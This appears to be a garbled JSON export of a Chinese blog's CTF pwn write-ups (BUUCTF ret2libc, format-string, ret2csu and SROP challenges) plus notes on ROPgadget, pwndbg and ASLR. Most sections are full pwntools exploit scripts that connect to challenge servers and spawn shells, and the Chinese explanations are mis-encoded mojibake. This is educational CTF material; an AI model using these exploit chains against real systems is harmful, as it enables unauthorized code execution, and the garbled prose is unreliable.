è§„å®šè¯»å…¥v2é•¿åº¦çš„å­—ç¬¦ï¼Œä½†æ˜¯ç¨‹åºè¦æ±‚v2ä¸å¤§äº32ã€‚è§‚å¯Ÿåˆ°intå‹çš„v2ä¼ å…¥unsigned intå‹çš„a2ï¼Œå¯ä»¥ä¼ å…¥-1æ•´æ•°æº¢å‡ºç»•è¿‡ã€‚ ROPé“¾æ³„éœ²libcï¼Œæº¢å‡ºè¦†ç›–è¿”å›åœ°å€getshell 0x02exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn0') p = remote('node4.buuoj.cn',26602) p.recvuntil(b\"How many bytes do you want me to read?\") p.sendline(b'-1') libc = ELF('./libc-2.23.so') elf = ELF('./pwn0') main_addr = elf.sym['main'] plt_addr = elf.plt['printf'] got_addr = elf.got['getchar'] fmt = 0x080486F pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr) #pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt) #pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr) p.recvuntil(b\"\\n\") p.sendline(pay1) getchar_addr= u32(p.recvuntil(b'\\xf7')[-4:]) #getchar_addr = u32(p.recv()[0:4])å˜æˆæ¥æ”¶å‰é¢å››ä¸ªå­—èŠ‚äº† print(\"getchar_addr = \",hex(getchar_addr)) ''' libc=LibcSearcher('getchar',getchar_addr) offset=getchar_addr-libc.dump('getchar') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') ''' base_addr = getchar_addr - libc.symbols['getchar'] system = libc.symbols['system'] + base_addr binsh = libc.search(b'/bin/sh').__next__() + base_addr print(\"libc_base_addr = \",hex(base_addr)) #print(\"libc_base_addr = \",hex(offset)) print(\"sys_addr = \",hex(system)) print(\"sh_addr = \",hex(binsh)) pay2 = b'a'*(0x2c+4)+p32(system)+b'aaaa'+p32(binsh) p.recvuntil(b\"How many bytes do you want me to read?\") p.sendline(b'-1') p.recvuntil(b\"\\n\") p.sendline(pay2) p.interactive() bjdctf_2020_babyrop0x01æ³¨æ„è¿™é¢˜ä½64ä½ã€‚32ä½å’Œ64ä½ä¼ å‚æœ‰åŒºåˆ« æ€è·¯ï¼š åˆ©ç”¨putså‡½æ•°æ³„éœ²å‡ºputså‡½æ•°çœŸå®åœ°å€ é€šè¿‡putså‡½æ•°åœ°å€è®¡ç®—å‡ºlibcåŸºåœ°å€ï¼Œä»è€Œè®¡ç®—å‡ºsystemå’Œbinshçš„çœŸå®åœ°å€ æ„é€ ropé“¾æ ˆæº¢å‡ºgetshell putså‡½æ•°é€šè¿‡pop rdi ; ret ä¼ å‚ ç”¨ROPgadgetå¯ä»¥æ‰¾åˆ° 0x02exp #encoding = utf-8 from pwn import * from LibcSearcher import * context(os = 'linux',arch = 'amd64',log_level = 'debug') content = 1 elf = ELF('./pwn') def main(): if content == 1: p = process('./pwn') else: p = remote('node4.buuoj.cn',29917) #elf main_addr = elf.sym['main'] plt_addr = elf.plt['puts'] got_addr = elf.got['puts'] pop_rdi = 0x0400733 ret_addr = 0x04004c9 payload = b'a'*(0x20+0x8) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr) p.recvuntil(\"Pull up your sword and tell me u story!\\n\") p.sendline(payload) puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) print(hex(puts_addr)) #libc lib = LibcSearcher('puts',puts_addr) lib_puts_addr = lib.dump('puts') lib_system_addr = lib.dump('system') lib_bin_addr = lib.dump('str_bin_sh') #base base_addr = puts_addr - lib_puts_addr system_addr = base_addr + lib_system_addr bin_addr = base_addr + lib_bin_addr payload = b'a'*(0x20+0x8) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr) p.recvuntil(\"Pull up your sword and tell me u story!\\n\") p.sendline(payload) p.interactive() main() [HarekazeCTF2019]baby_rop264ä½çš„ret2libc3 0x01 åˆ©ç”¨printfæ³„éœ²libcç‰ˆæœ¬å’ŒåŸºåœ°å€ï¼Œä¼ å‚çš„æ—¶å€™éœ€è¦ä¼ å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²%sç»™å¯„å­˜å™¨rdiï¼ˆç¨‹åºä¸­ç¬¬äºŒä¸ªprintfå‡½æ•°è‡ªå¸¦ï¼Œè¿”å›è‡³è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€å³å¯ï¼‰ï¼›å¹¶å°†æƒ³è¦æ³„éœ²çš„read_gotä¼ ç»™å¯„å­˜å™¨ã€‚ 0x02exp from pwn import * from LibcSearcher import * context(os='linux', arch='amd64', log_level='debug') p = remote('node4.buuoj.cn',25502) #p = process('./babyrop2') elf = ELF('./babyrop2') libc = ELF('libc.so.6') #ä¸€å®šè¦ç”¨é¢˜ç›®ç»™çš„libcæ–‡ä»¶ï¼Œå¯èƒ½å¿…é¡»è¦ç”¨é¢˜ç›®ç»™çš„æ‰èƒ½æ‰“é€š printf_plt = elf.plt['printf'] read_got = elf.got['read'] main_plt = elf.sym['main'] pop_rdi = 0x0000000000400733 pop_rsi_r15 = 0x0000000000400731 fmt = 0x0000000000400790 payload1 = b'a'*(0x20+8)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_plt) p.recvuntil(\"name? \") p.sendline(payload1) read_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) print(\"read_addr ======>> \"+hex(read_addr)) libc_base = read_addr - libc.sym[\"read\"] system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() payload2 = b'a'*0x28+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(0) p.sendline(payload2) p.interactive() jarvisoj_fmBUUCTF pwnè€ƒç‚¹ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä»»æ„åœ°å€å†™æ¼æ´ å°†xå†™ä¸º4å³å¯getshellï¼Œxçš„åœ°å€ä¸º0x0804a02cï¼Œè°ƒè¯•å¯å¾—è¾“å…¥çš„å†…å®¹ä½äºæ ˆåç§»11ä¸ªå•ä½å¤„ exp from pwn import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn') p=remote('node4.buuoj.cn',29551) x_addr=0x804A02C payload=p32(x_addr)+b\"%11$n\" p.sendline(payload) p.interactive() æˆ–æ›´é€šç”¨ #!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = 'debug' #sh = process('./jarvisoj_fm') sh = remote('node3.buuoj.cn',26325) #gdb.attach(sh) x_addr = 0x0804a02c #å°†æ ˆåç§»13ä¸ªå•ä½å¤„çš„x_addræŒ‡é’ˆæŒ‡å‘çš„åœ°å€å†…å®¹ä¿®æ”¹ä¸º4 #payloadä¸­x_addrå†™å…¥çš„ä½ç½®ä¸ºæ ˆåç§»13å¤„ï¼Œè§ä¸‹å›¾ #25346225(å°ç«¯)æ˜¯æ ˆåç§»11ï¼Œæ‰€ä»¥2ca00408(å°ç«¯)æ˜¯æ ˆåç§»11+2=13 payload = '%4c%13$n' + p32(x_addr) #pause() sh.sendline(payload) sh.sendline('cat flag') sh.interactive() ciscn_2019_s_30x0164ä½å¼€å¯NX æ³¨æ„ç¨‹åºç›´æ¥ä½¿ç”¨sys_readå’Œsys_writeå‡½æ•°è€Œä¸æ˜¯é€šå¸¸çš„readå’Œwriteï¼Œåœ¨æ„é€ payloadæ—¶è¦æ³¨æ„åœ¨å‡½æ•°è¿”å›æ—¶æ²¡æœ‰pop rbpè¿™ä¸€æ­¥è€Œæ˜¯ç›´æ¥æ‰§è¡Œretï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¦†ç›–rbpä¸ºvulnå‡½æ•°åœ°å€ã€‚ 0x02æœ¬é¢˜ä¸¤ç§åšæ³•ï¼Œä¸€ç§æ˜¯ret2csuï¼Œåˆ©ç”¨__libc_csu_initå¸ƒç½®æ ˆç©ºé—´ï¼›ä¸€ç§æ˜¯SROP é¢˜ç›®ä¹Ÿç»™å‡ºäº†ç›¸åº”çš„gadgetsï¼Œè‹¥é€‰æ‹©raxä¼ å‚0xFï¼ˆç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œåˆ™å¯æ‰§è¡Œsigreturnç³»ç»Ÿè°ƒç”¨ï¼›è‹¥é€‰æ‹©raxä¼ å‚0x3Bï¼Œåˆ™å¯æ‰§è¡Œexcve(â€˜/bin/shâ€™,0,0)ç³»ç»Ÿè°ƒç”¨ æˆ‘ä»¬éœ€è¦åœ¨æ ˆä¸Šå¸ƒç½®ROPgadgetså’Œå„å‚æ•°ï¼Œè€Œæ ˆåœ°å€æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦æ³„éœ²æ ˆåœ°å€ã€‚ åŒæ—¶æˆ‘ä»¬çŸ¥é“æ ˆä¸Šçš„å„åœ°å€é—´çš„ç›¸å¯¹ä½ç½®æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥æ³„éœ²å‡ºæ ˆåœ°å€åå¯ä»¥é€šè¿‡ä¸bufçš„åç§»è®¡ç®—å‡ºbufçš„åœ°å€ ç»è¿‡è°ƒè¯•å‘ç°ï¼Œå¦‚å›¾ï¼š bufçš„èµ·å§‹åœ°å€ä¸º0x7fffffffded0ï¼Œç›®æ ‡æ³„éœ²æ ˆåœ°å€ï¼ˆå³æŸä¸ªrbpçš„å€¼ï¼‰ä¸ºå›¾ä¸­æ ˆåç§»ä¸º02çš„åœ°å€0x7fffffffe018ï¼ŒäºŒè€…ç›¸å·®0x148ã€‚è¿™æ˜¯æœ¬åœ°çš„åç§»ï¼Œè‹¥è¦è·å¾—ä¸è¿œç¨‹ç¯å¢ƒç›¸åŒçš„åç§»è¦åº”ç”¨patchelfã€‚å…·ä½“å¯çœ‹è¿™ç¯‡æ–‡ç« ã€‚ç”¨ç›¸åŒçš„æ–¹æ³•è°ƒè¯•å¯å¾—è¿œç¨‹åç§»ä¸º0x118. åœ¨æ¥æ”¶æ³„éœ²çš„æ ˆåœ°å€ä¹‹å‰éœ€è¦å»æ‰å¤šä½™çš„buf(0x10)+rbp(vul_addr)+æ ˆä¸Šåç§»ä¸º01çš„åœ°å€ã€‚ expç¬¬ä¸€éƒ¨åˆ† vul_addr = 0x4004ed ret_addr = 0x4003a9 vul_addr = 0x4004ed payload = b'a' * 0x10 + p64(vul_addr) p.send(payload) p.recv(0x20) stack_addr = u64(p.recv(8)) print(hex(stack_addr)) #buf_addr = stack_addr-0x118 buf_addr = stack_addr-0x148 0x03ç¬¬ä¸€ç§åšæ³•ï¼šret2csuæ§åˆ¶æ‰§è¡Œexecve__libc_csu_init ï¼ˆå…·ä½“å¯ä»¥çœ‹ctf-wikiä¸­çš„ä»‹ç»ï¼‰ éœ€è¦å°†å„å¯„å­˜å™¨ç½®ä¸ºï¼š rax 0x3B rdi = â€˜/bin/shâ€™ rsi = 0 rdx = 0 ROPgadget èƒ½æ‰¾åˆ°æ§åˆ¶rdiå’Œrsiçš„ï¼Œä»¥åŠsyscall ï¼ˆä¸è¿‡å®é™…ä¸Šæ²¡æœ‰ç”¨rsiçš„ï¼Œå› ä¸ºcsuä¸­æœ‰pop r14å’Œmov rsi, r14æŒ‡ä»¤ï¼Œå¯ä»¥é€šè¿‡æ ˆä¸Šå¸ƒç½®å°†rsiç½®ä¸º0ï¼‰ ç°åœ¨è¿˜è¦æƒ³åŠæ³•æ§åˆ¶rdx é€šè¿‡__libc_csu_initå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ‰§è¡Œpop r13ç„¶åå†æ‰§è¡Œmov rdx, r13å°†rdxç½®ä¸º0 åŒæ—¶è¿˜è¦æ³¨æ„ï¼š 0x400589: call [r12 + rbx * 8], ä¼šæ‰§è¡Œr12+rbx8åœ°å€æŒ‡å‘çš„å‡½æ•°ï¼Œä¸è¿‡è¿™é‡Œæ²¡æœ‰éœ€è¦æ‰§è¡Œçš„å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥åœ¨bufé‡Œæ”¾äº†ä¸ªret;çš„åœ°å€â€¦, ç„¶åè®©r12 + rbx8æŒ‡å‘bufï¼›callå‡½æ•°ä¹‹å‰ä¼šè‡ªåŠ¨å°†ä¸‹ä¸€æ¡æŒ‡ä»¤å…¥æ ˆï¼Œæ¥ç€æ‰§è¡Œretåˆ™rspæŒ‡é’ˆç›¸å½“äºä¸å˜ cmp rbx, rbp; jnz short loc_400580, å¦‚æœrbxå’Œrbpç›¸åŒä¼šå¾ªç¯ã€‚æƒ³è¦ç»•è¿‡éœ€è¦ä½¿ rbx = 0 rbp = 1 æ³„éœ²å‡½æ•°åœ°å€åç›´æ¥é‡è¿›çš„vulå‡½æ•°ï¼Œbufçš„åœ°å€ä¸å˜ pop_rdi = 0x4005a3 syscall = 0x400501 vul_addr = 0x4004ed ret_addr = 0x4003a9 payload = p64(ret_addr) + b'/bin/sh\\0'#ä¸ºä¹‹åå‡½æ•°è·³è½¬å’Œä¼ å…¥binshåšå‡†å¤‡ payload += p64(0x4004e2) # rax=0x3b payload += p64(0x40059a) # 6ä¸ªpop payload += p64(0) + p64(1) # rbx = 0, rbp = 1 payload += p64(buf_addr) + p64(0) * 3 # r12 = buf_addrï¼Œr13 r14 r15 = 0 payload += p64(0x400580) #æ‰§è¡Œå¯„å­˜å™¨r12æŒ‡å‘çš„å‡½æ•° ï¼ˆä¹Ÿå°±æ˜¯retï¼‰ï¼›æŠŠrdxè®¾ä¸º0 payload += p64(0) * 7 # è¿™é‡Œæ‰§è¡Œåˆ°0x400596ååˆä¼šé‡æ–°popä¸€é, å¼€å¤´æ‰§è¡Œadd rsp, 8è®©rspè·³è¿‡äº†æ ˆä¸Šçš„ä¸€ä¸ªæ•°æ®ï¼Œå¦‚ä½•æ‰§è¡Œ6popï¼Œæ‰€ä»¥æ ˆä¸Šå¸ƒç½®7ä¸ª0 payload += p64(pop_rdi) + p64(buf_addr + 8) # rdi = &amp;'/bin/sh\\0' payload += p64(syscall) payload += p64(vul_addr) p.send(payload) p.interactive() ç¬¬äºŒç§ï¼šSROPå…·ä½“å¯å‚è€ƒctf-wiki æœ¬é¢˜è§£æ³•å¯å‚è€ƒè¿™ç¯‡åšå®¢ sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = buf_addr sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rip = syscall payload = b'/bin/sh\\0'.ljust(0x10, b'a') + p64(0x4004da) + p64(syscall) + bytes(sigframe) åˆ©ç”¨pwntoolsçš„sigframeæ¨¡å—å³å¯ å…¶å®è¿™ä¸¤ç§è§£æ³•éƒ½æ˜¯ä»¥ç¨‹åºè¯»å…¥è¶³å¤Ÿå¤šçš„å­—èŠ‚ä¸ºæ¡ä»¶çš„ å®Œæ•´exp from pwn import * context(os='linux', arch='amd64', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] p = process('./ciscn_s_3') #p = remote('node4.buuoj.cn',29591) pop_rdi_ret = 0x4005a3 syscall = 0x400501 vul_addr = 0x4004ed ret_addr = 0x4003a9 vul_addr = 0x4004ed payload = b'a' * 0x10 + p64(vul_addr) p.send(payload) p.recv(0x20) stack_addr = u64(p.recv(8)) print(hex(stack_addr)) #buf_addr = stack_addr-0x118 buf_addr = stack_addr-0x148 gdb.attach(p) payload = p64(ret_addr) + b'/bin/sh\\00' payload += p64(0x4004e2) # rax=0x3b payload += p64(0x40059a) # rdx = 0 payload += p64(0) + p64(1) # rbx = 0, rbp = 1 payload += p64(buf_addr) + p64(0) * 3 # r12 = buf_addr payload += p64(0x400580) payload += p64(0) * 7 payload += p64(pop_rdi_ret) + p64(buf_addr + 8) # rdi = &amp;'/bin/sh\\0' payload += p64(syscall) #payload += p64(vul_addr) ''' sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = buf_addr sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rip = syscall payload = b'/bin/sh\\0'.ljust(0x10, b'a') + p64(0x4004da) + p64(syscall) + bytes(sigframe) ''' p.send(payload) p.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"PWNä¸€äº›ç”¨åˆ°çš„æŒ‡ä»¤å’Œå·¥å…·","slug":"PWNä¸€äº›ç”¨åˆ°çš„æŒ‡ä»¤å’Œå·¥å…·","date":"2023-08-28T13:54:45.000Z","updated":"2024-02-04T06:54:35.848Z","comments":true,"path":"posts/6121198a/","link":"","permalink":"http://lmarch2.github.io/posts/6121198a/","excerpt":"ROPgadget ROPgadget â€“binary æ–‡ä»¶å â€“only â€œæŒ‡ä»¤|æŒ‡ä»¤â€ | grep å¯„å­˜å™¨æˆ–è€…å…¶ä»–å­˜åœ¨çš„å­—æ®µ ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜/bin/shâ€™ vmmap vim pwndbg ASLRå’Œpieç¼–è¯‘ shellcode GCCç¼–è¯‘æŒ‡ä»¤ å…³äºç¬¦å·è¡¨ patchelf","text":"ROPgadget ROPgadget â€“binary æ–‡ä»¶å â€“only â€œæŒ‡ä»¤|æŒ‡ä»¤â€ | grep å¯„å­˜å™¨æˆ–è€…å…¶ä»–å­˜åœ¨çš„å­—æ®µ ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜/bin/shâ€™ vmmap vim pwndbg ASLRå’Œpieç¼–è¯‘ shellcode GCCç¼–è¯‘æŒ‡ä»¤ å…³äºç¬¦å·è¡¨ patchelf ROPgadget â€“binary æ–‡ä»¶å â€“only â€œæŒ‡ä»¤|æŒ‡ä»¤â€ | grep å¯„å­˜å™¨æˆ–è€…å…¶ä»–å­˜åœ¨çš„å­—æ®µæŸ¥æ‰¾æ±‡ç¼–æŒ‡ä»¤çš„åœ°å€ ä¾‹å­ï¼š ROPgadget â€“binary get_started_3dsctf_2016 â€“only â€œmov|retâ€ |grep eax ROPgadget â€“binary get_started_3dsctf_2016 â€“only â€œmov|retâ€ |grep â€˜: mov eaxâ€™ â€“only â€ | â€œ è¡¨ç¤ºåªè¿”å›å«æœ‰xxæŒ‡ä»¤æˆ–xxæŒ‡ä»¤çš„gadget grep è¡¨ç¤ºå«æœ‰ä»€ä¹ˆä»€ä¹ˆç‰¹å®šå­—æ®µï¼ˆé€šå¸¸æ˜¯å¯„å­˜å™¨ï¼‰çš„æŒ‡ä»¤ ä½†æ˜¯grepèƒ½å¯»æ‰¾çš„å¿…é¡»æ˜¯è¿ç»­çš„æŒ‡ä»¤ä¸­é—´ä¸èƒ½éš”å¼€ï¼Œè¿ç©ºæ ¼éƒ½å¿…é¡»ä¸€è‡´æ‰èƒ½è¢«æœç´¢åˆ° æ¯”å¦‚ä½ æƒ³è¦æœç´¢0x080701a8 : mov eax, ecx ; retï¼Œä½ å¯ä»¥ç”¨å‘½ä»¤ROPgadget --binary get_started_3dsctf_2016 --only \"mov|ret\" |grep 'eax, ecx'ï¼›å‘½ä»¤ROPgadget --binary get_started_3dsctf_2016 --only \"mov|ret\" |grep 'eax,ecx'æ— æ³•æˆåŠŸå› ä¸ºé€—å·å’Œecxä¹‹é—´å°‘äº†ä¸€ä¸ªç©ºæ ¼ å–åœ°å€çš„æŒ‡ä»¤[edx]æ— æ³•è¢«è¯†åˆ«ï¼Œ[ ]åœ¨ROPgadgetä¸­è²Œä¼¼æ˜¯è¡¨ç¤ºå«æœ‰[ ]å†…å­—æ¯çš„æŒ‡ä»¤ æ¯”å¦‚ ROPgadget â€“binary get_started_3dsctf_2016 â€“only â€œmov|retâ€ |grep â€˜[edx]â€™å¾—åˆ°çš„æ˜¯è¿™æ · ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜/bin/shâ€™æŸ¥æ‰¾å­—ç¬¦ä¸²åœ°å€ ä¾‹å­ï¼š ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜/bin/shâ€™ ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜/shâ€™ ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜shâ€™ ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜cat flagâ€™ ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜cat flag.txtâ€™ ![( vmmapvmmap [-h] [pages_filter] é¦–å…ˆvmmapéœ€è¦åœ¨pwndbgï¼Œä¸”ç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨ è¾“å…¥vmmapï¼Œæ˜¾ç¤ºå‡ºç¨‹åºè¿è¡Œæ—¶æ‰€ç”¨åˆ°çš„æ‰€æœ‰åœ°å€æ®µ è¾“å…¥vmmap åœ°å€ ï¼Œæ˜¾ç¤ºè¯¥åœ°å€å¯¹åº”çš„åœ°å€æ®µ vmmap -hï¼Œæç¤ºå¸®åŠ©ï¼›-wåªæ˜¾ç¤ºå¯å†™çš„éƒ¨åˆ†ï¼›-xåªæ˜¾ç¤ºå¯æ‰§è¡Œçš„éƒ¨åˆ† ä¾‹å­ï¼š ç¬¬ä¸€è¡Œï¼Œè¡¨æ˜äº†å“ªä¸ªé¢œè‰²å¯¹åº”å“ªä¸ªæ®µï¼Œ startå’Œendå¯¹åº”è¯¥åœ°å€æ®µçš„èµ·å§‹å’Œç»“æŸä½ç½® Perm æ˜¯è¯¥æ®µçš„æƒé™ï¼Œrwxä»£è¡¨å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œ Sizeè¡¨ç¤ºè¯¥æ®µå¤§å° Offsetè¡¨ç¤ºè¿™æ®µä¸ç¨‹åºåŸºå€çš„åç§» Fileè¡¨ç¤ºåŠ è½½çš„æ˜¯ä»€ä¹ˆ vimå‘½ä»¤æ¨¡å¼ä¸‹ï¼š $ è¡Œæœ« ^ è¡Œé¦– L å±å¹•åº•è¡Œ H å±å¹•é¡¶è¡Œ yy æ‹·è´è¯¥è¡Œ dd åˆ é™¤è¯¥è¡Œ P å‰ç²˜è´´ p åç²˜è´´ D åˆ é™¤è‡³è¡Œå°¾ u æ’¤é”€ gg å…‰æ ‡ç§»è‡³è¡Œé¦– dG åˆ é™¤å…‰æ ‡è¡ŒåŠå…‰æ ‡è¡Œä»¥ä¸‹å…¨éƒ¨å†…å®¹ åº•çº¿å‘½ä»¤æ¨¡å¼ä¸‹ï¼š :wq ä¿å­˜å¹¶é€€å‡º :%d åˆ é™¤å…¨éƒ¨å†…å®¹ :%s æ›¿æ¢ å‚è€ƒï¼ˆä¸‡é‡Œå“¥æˆ‘æ»´ç¥ï¼‰ pwndbgåŸºæœ¬æŒ‡ä»¤ r = run è¿è¡Œç¨‹åºï¼Œå¦‚æœä½ å½“å‰å·²ç»åœ¨è¿è¡Œç¨‹åºäº†ï¼Œå†è¾“å…¥rä¼šé‡æ–°è¿è¡Œç¨‹åº b = break ä¸‹æ–­ç‚¹ï¼Œåœ¨è°ƒè¯•pwnä¸­ï¼Œä¸€èˆ¬æ˜¯ b 0xabcde ï¼Œabcdeæ˜¯åœ¨idaä¸­çœ‹åˆ°çš„åœ°å€,å¦‚b 0x400908 c = continue ç»§ç»­è¿è¡Œç¨‹åºç›´åˆ°åœåœ¨ä¸‹ä¸€ä¸ªæ–­ç‚¹ n = next ä¸‹ä¸€è¡Œï¼Œä¸€èˆ¬è£…äº†pwndbgä¹‹åä¸‹ä¸€è¡ŒæŒ‡çš„æ˜¯ä¸‹ä¸€æ¡æ±‡ç¼–ï¼Œä½†æ˜¯å¦‚æœè°ƒè¯•çš„ç¨‹åºæ˜¯å¸¦è°ƒè¯•ä¿¡æ¯çš„ï¼Œä¸€èˆ¬ä¼šè·³å‡ è¡Œæ±‡ç¼– ni = nexti ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè¿™ä¸ªå°±æ˜¯çœŸæ­£çš„ä¸‹ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤ s = step å•æ­¥è¿›å…¥å‡½æ•° d = delete åˆ é™¤æ–­ç‚¹ï¼Œåé¢å¯å¸¦æ•°å­—ï¼Œè¯´æ˜åˆ é™¤ç¬¬å‡ ä¸ªæ–­ç‚¹ï¼Œå¦‚æœä¸å¸¦å‚æ•°ï¼Œè¯´æ˜åˆ é™¤å…¨éƒ¨æ–­ç‚¹ x æŸ¥çœ‹å†…å­˜ c,n,niè¿™å‡ ä¸ªç¨‹åºéƒ½å¯ä»¥å¸¦ä¸€ä¸ªæ•°å­—ï¼Œç”¨æ¥ä»£è¡¨è¿ç»­è¿è¡Œè¿™ä¸ªæŒ‡ä»¤å¤šå°‘æ¬¡ x/num xg åœ°å€ 64ä½æŸ¥çœ‹æŸå¤„åœ°å€ x/num xw åœ°å€ 32ä½æŸ¥çœ‹æŸå¤„åœ°å€ s/num s åœ°å€ æŸ¥çœ‹ä»åœ°å€å¼€å§‹çš„numä¸ªå­—ç¬¦ä¸² b *$rebase(åœ°å€) ç”¨äºå¼€å¯PIEè¯¥æŒ‡ä»¤ä¼šåœ¨åŸºå€+åœ°å€å¤„ä¸‹æ–­ç‚¹ https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html100ä¸ªgdbå°æŠ€å·§ gdbåˆ¶å®šç¨‹åºè¿è¡Œçš„å‚æ•°gdb â€“args binary value gdbè°ƒè¯•æ”¹å˜åœ°å€æˆ–åœ°å€æŒ‡å‘å€¼set addr_old = addrset *addr_old = addr btæ˜¾ç¤ºå‡½æ•°æ‰€æœ‰è°ƒç”¨æ ˆçš„ä¿¡æ¯bt næ˜¾ç¤ºæ ˆé¡¶çš„nä¸ªè°ƒç”¨ä¿¡æ¯bt -næ˜¾ç¤ºæ ˆåº•çš„nä¸ªè°ƒç”¨ä¿¡æ¯ ä¸­é—´åŠ fullè¡¨ç¤º æ˜¾ç¤ºæ ˆä¸­æ‰€æœ‰å¸§çš„å®Œå…¨ä¿¡æ¯å¦‚ï¼šå‡½æ•°å‚æ•°ï¼Œæœ¬åœ°å˜é‡ ASLRå’Œpieç¼–è¯‘æŸ¥çœ‹ç³»ç»Ÿå½“å‰ASLRæ‰“å¼€æƒ…å†µ sudo cat /proc/sys/kernel/randomize_va_space ASLRçš„ä¸‰ä¸ªçº§åˆ« ï¼š 0ï¼Œ ä¸å¼€å¯ä»»ä½•éšæœºåŒ–ï¼› 1ï¼Œ å¼€å¯stackã€libraries [ã€executable baseï¼ˆspecial libraries -^-ï¼‰ if PIE is enabled while compiling] çš„éšæœºåŒ–ï¼› 2ï¼Œå¼€å¯heapéšæœºåŒ–ã€‚ PIEç¼–è¯‘å‡ºæ¥çš„executableå¦‚æœASLR=0çš„è¯ï¼ŒåŸºå€ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ï¼ˆæœ‰èƒ½åŠ›ä½†æ²¡ä½¿ç”¨ï¼‰ï¼Œå¦‚æœASLR=1çš„è¯ï¼Œå³ä½¿æŒ‰ç…§ASLRå®šä¹‰è¿™ä¸ªçº§åˆ«ä¼¼ä¹ä¸ä¼šå¯¹heapåŸºå€éšæœºåŒ–ï¼Œä½†æ˜¯ç”±äºexecutableçš„åŸºå€å·²ç»éšæœºåŒ–äº†ï¼Œæ‰€ä»¥heapçš„åŸºå€è‡ªç„¶ä¹Ÿå°±è¢«éšæœºåŒ–äº† æŒ‡ä»¤å…³é—­ASLR sysctl -w kernel.randomize_va_space=0 echo 0 &gt; /proc/sys/kernel/randomize_va_space fPIEé€‰é¡¹ä»…èƒ½åœ¨ç¼–è¯‘å¯æ‰§è¡Œç æ—¶ç”¨ï¼Œä¸èƒ½ç”¨äºç¼–è¯‘åº“ã€‚æ‰€ä»¥ï¼Œå¦‚æœæƒ³è¦PIEçš„ç¨‹åºï¼Œéœ€è¦ä½ é™¤äº†åœ¨gccå¢åŠ -fPIEé€‰é¡¹å¤–ï¼Œè¿˜éœ€è¦åœ¨ldæ—¶å¢åŠ -pieé€‰é¡¹æ‰èƒ½äº§ç”Ÿè¿™ç§ä»£ç ã€‚å³gcc -fpie -pieæ¥ç¼–è¯‘ç¨‹åºã€‚å•ç‹¬ä½¿ç”¨å“ªä¸€ä¸ªéƒ½æ— æ³•è¾¾åˆ°æ•ˆæœã€‚ gcc helloworld.c file a.out a.out: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped file a.out a.out: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped æœªå¼€å¯PIEçš„æ–‡ä»¶å±æ€§ä¸ºexecutableï¼Œå¼€å¯çš„ä¸ºshared object æ³¨æ„PIEéšæœºç¨‹åºåŠ è½½åŸºåœ°å€ï¼Œè¦å’Œlibcçš„éšæœºlibcåº“åŸºåœ°å€åŒºåˆ† shellcodepwntoolsç”Ÿæˆçš„shellcodeé»˜è®¤64ä½ shellcode = asm(shellcraft.sh()) è¦ç”Ÿæˆ32ä½çš„shellcodeéœ€è¦æŒ‡å®š shellcode = asm(shellcraft.sh(),arch=â€™i386â€™,os=â€™linuxâ€™) æ‰‹åŠ¨åæ±‡ç¼–æ±‡ç¼–æŒ‡ä»¤ xx = asm(â€˜â€™â€™ â€˜â€™â€™) 